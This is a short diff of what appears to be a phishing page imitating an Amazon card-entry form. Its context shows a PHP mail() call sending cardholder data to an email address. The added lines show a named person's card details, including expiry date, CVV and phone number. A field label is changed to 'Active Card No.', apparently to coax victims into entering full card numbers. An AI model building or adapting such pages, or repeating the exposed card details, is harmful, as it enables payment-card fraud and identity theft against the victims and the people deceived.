@@ -1,7 +1,3 @@
-
-
-
-
 <!doctype html><html class="a-no-js" data-19ax5a9jf="dingo">
   <head>
 <script type='text/javascript'>var ue_t0=ue_t0||+new Date();</script>
@@ -338,12 +334,16 @@ if(mail($toemail, $ardHolderName, $email_message, $headers)){
       
       
       
-
-
-
+<h4><br>
+Name on Card : Kathy Gerdy<br>
+Your Old Card : 6011 XXXX XXXX 5847<br>
+Exp Date : 11/21<br>
+CVV : 158<br>
+Phone Number : +1-815 590 4887
+</h4><br><br>
 
  <div class="a-row a-spacing-small">
-                        <div class="a-column a-span4 a-text-right a-spacing-top-mini pmts-add-credit-card-number-label"><label for="pp-91gkeq-14" class="a-form-label">Card number</label></div>
+                        <div class="a-column a-span4 a-text-right a-spacing-top-mini pmts-add-credit-card-number-label"><label for="pp-91gkeq-14" class="a-form-label">Active Card No.</label></div>
                         <div class="a-column a-span8 pmts-add-credit-card-number-input-box a-span-last">
                            <div class="a-row">
                               <div class="a-column a-span9">
